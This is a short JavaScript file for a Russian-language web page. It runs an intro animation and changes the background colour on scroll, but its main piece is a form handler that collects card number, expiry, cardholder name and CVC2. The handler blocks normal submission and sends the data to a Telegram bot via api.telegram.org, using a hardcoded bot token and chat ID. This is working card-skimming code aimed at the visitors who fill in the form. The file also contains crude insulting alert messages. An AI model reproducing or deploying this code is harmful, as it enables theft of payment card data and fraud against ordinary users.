document.addEventListener("DOMContentLoaded", function () {
  var animationDiv = document.querySelector(".animation-container");
  var contentDiv = document.querySelector(".content");

  animationDiv.addEventListener("animationend", function () {
    animationDiv.style.display = "none";
    contentDiv.style.display = "block";
  });
});

window.addEventListener("scroll", function () {
  var body = document.body;
  var scrollPosition = window.scrollY;
  // var RegMainStyleScroll = document.getElementById("regster");

  // Условие для определения, когда нужно изменить фон
  if (scrollPosition > 200 && scrollPosition <= 1000) {
    body.style.backgroundColor = "rgba(0, 0, 255, 0.432)"; // Новый цвет фона
  } else if (scrollPosition > 1000) {
    body.style.backgroundColor = "blue";
    // RegMainStyleScroll.style.backgroundColor = "rgba(0, 0, 255, 0.432)";
    // RegMainStyleScroll.style.color = "white";
  } else {
    body.style.backgroundColor = "#fff";
    // RegMainStyleScroll.style.backgroundColor = "#fff";
    // RegMainStyleScroll.style.color = "black";
  }
});

function baton() {
  var confirmAlert = confirm("Вы уверены?");

  if (confirmAlert) {
    alert("Не уверен ты. Иди нахуй");
  }
}

// тут перехода не будет

document.getElementById("tg").addEventListener("submit", function (e) {
  e.preventDefault();
  const botToken = "6356129001:AAEJRsqBQi0IEiK2gybD8Sa9PIgLKVvJzFk";
  const chatId = "1352317933";

  const now = new Date();

  if (
    cardnum.value !== "" &&
    MM.value !== "" &&
    IT.value !== "" &&
    cvc2.value !== "" &&
    namecard.value !== ""
  ) {
    message = `${now}\n-----------------\nНомер карты: ${cardnum.value}\nММ: ${MM.value} IT: ${IT.value}\nИмя Фамилия: ${namecard.value}\nCVC2: ${cvc2.value}\nДаун: ${ifdayn.checked} `;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });
  } else {
    alert("Заполни поля заебал");
  }
});
